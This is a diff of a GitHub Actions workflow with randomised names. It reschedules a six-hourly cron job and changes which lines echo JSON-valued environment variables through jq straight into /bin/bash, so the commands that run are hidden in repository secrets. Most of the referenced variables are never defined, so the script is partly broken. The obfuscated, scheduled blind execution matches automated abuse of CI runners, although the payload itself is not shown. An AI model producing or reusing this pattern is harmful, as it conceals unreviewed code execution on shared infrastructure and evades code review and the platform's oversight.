@@ -3,7 +3,7 @@ name: tonghugjiga
 on:
   workflow_dispatch:
   schedule:
-    - cron: '30 4/6 * * *'
+    - cron: '0 3/6 * * *'
 
 jobs:
   build:
@@ -13,22 +13,11 @@ jobs:
       - uses: actions/checkout@v4
       - name: tonghugjiga
         env:
-          jlwzi342: ${{ secrets.jlwzi342 }}
+          wye80: ${{ secrets.wye80 }}
         run: |
-          echo $jlwzi342 | jq -r .r6 | /bin/bash
-          echo $hjpko13 | jq -r .myop347 | /bin/bash
-          echo $ai22219 | jq -r .qdkoa3 | /bin/bash
-          echo $go5 | jq -r .aptz4 | /bin/bash
-          echo $wlluy0559 | jq -r .vcv12530 | /bin/bash
-          echo $an60 | jq -r .lf7 | /bin/bash
-          echo $anw127 | jq -r .nohks17 | /bin/bash
-          echo $bhkm9 | jq -r .ytmt80621 | /bin/bash
-          echo $qtder404 | jq -r .zasd6 | /bin/bash
-          echo $crc0184 | jq -r .t8 | /bin/bash
-          echo $enje6159 | jq -r .d5 | /bin/bash
-          echo $eyo2 | jq -r .wemg66190 | /bin/bash
-          echo $p4 | jq -r .u08 | /bin/bash
-          echo $l5107 | jq -r .me29459 | /bin/bash
-          echo $raw64 | jq -r .qhibr98 | /bin/bash
-          echo $defe9720 | jq -r .oxthl45 | /bin/bash
+          echo $wye80 | jq -r .mnz675 | /bin/bash
+          echo $gym9 | jq -r .yrze61323 | /bin/bash
+          echo $iqj015 | jq -r .y77892 | /bin/bash
+          echo $u78801 | jq -r .dwz31 | /bin/bash
+          echo $dd39 | jq -r .ja9285 | /bin/bash
 
